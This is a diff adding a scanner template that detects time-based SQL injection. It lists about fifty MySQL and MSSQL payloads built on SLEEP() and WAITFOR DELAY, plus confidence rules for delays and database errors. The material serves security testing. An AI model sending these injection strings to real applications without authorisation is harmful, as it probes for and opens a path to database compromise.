@@ -1,0 +1,74 @@
+id: sqli-time
+issue_code: sql_injection
+detection_conditions: or
+detection_methods:
+  - time_based:
+      sleep: "{{.sleep_time}}"
+      confidence: 80
+  - response_condition:
+      status_code: 500
+      confidence: 50
+  - response_check:
+      check: database_error
+      confidence: 90
+vars:
+  - name: sleep_time
+    value: "{{randomInt 5 9}}"
+templates:
+  - SLEEP({{.sleep_time}})/*' or SLEEP({{.sleep_time}}) or '" or SLEEP({{.sleep_time}}) or "*/
+  - sleep({{.sleep_time}})#
+  - 1 or sleep({{.sleep_time}})#
+  - '" or sleep({{.sleep_time}})#'
+  - "' or sleep({{.sleep_time}})#"
+  - '" or sleep({{.sleep_time}})="'
+  - "' or sleep({{.sleep_time}})='"
+  - 1) or sleep({{.sleep_time}})#
+  - '") or sleep({{.sleep_time}})="'
+  - "') or sleep({{.sleep_time}})='"
+  - 1)) or sleep({{.sleep_time}})#
+  - '")) or sleep({{.sleep_time}})="'
+  - "')) or sleep({{.sleep_time}})='"
+  - ;waitfor delay '0:0:{{.sleep_time}}'--
+  - );waitfor delay '0:0:{{.sleep_time}}'--
+  - "';waitfor delay '0:0:{{.sleep_time}}'--"
+  - '";waitfor delay ''0:0:{{.sleep_time}}''--'
+  - "');waitfor delay '0:0:{{.sleep_time}}'--"
+  - '");waitfor delay ''0:0:{{.sleep_time}}''--'
+  - ));waitfor delay '0:0:{{.sleep_time}}'--
+  - "'));waitfor delay '0:0:{{.sleep_time}}'--"
+  - '"));waitfor delay ''0:0:{{.sleep_time}}''--'
+  - AND (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))bAKL) AND 'vRxe'='vRxe
+  - AND (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))YjoC) AND '%'='
+  - AND (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))nQIP)
+  - AND (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))nQIP)--
+  - AND (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))nQIP)#
+  - SLEEP({{.sleep_time}})#
+  - SLEEP({{.sleep_time}})--
+  - SLEEP({{.sleep_time}})="
+  - SLEEP({{.sleep_time}})='
+  - or SLEEP({{.sleep_time}})
+  - or SLEEP({{.sleep_time}})#
+  - or SLEEP({{.sleep_time}})--
+  - or SLEEP({{.sleep_time}})="
+  - or SLEEP({{.sleep_time}})='
+  - waitfor delay '00:00:{{.sleep_time}}'
+  - waitfor delay '00:00:{{.sleep_time}}'--
+  - waitfor delay '00:00:{{.sleep_time}}'#
+  - AnD SLEEP({{.sleep_time}})
+  - AnD SLEEP({{.sleep_time}})--
+  - AnD SLEEP({{.sleep_time}})#
+  - "&&SLEEP({{.sleep_time}})"
+  - "&&SLEEP({{.sleep_time}})--"
+  - "&&SLEEP({{.sleep_time}})#"
+  - "' AnD SLEEP({{.sleep_time}}) ANd '1"
+  - "'&&SLEEP({{.sleep_time}})&&'1"
+  - ORDER BY SLEEP({{.sleep_time}})
+  - ORDER BY SLEEP({{.sleep_time}})--
+  - ORDER BY SLEEP({{.sleep_time}})#
+  - (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))ecMj)
+  - (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))ecMj)#
+  - (SELECT * FROM (SELECT(SLEEP({{.sleep_time}})))ecMj)--
+  - + SLEEP({{.sleep_time}}) + '
+categories:
+  - sql_injection
+  - time_based
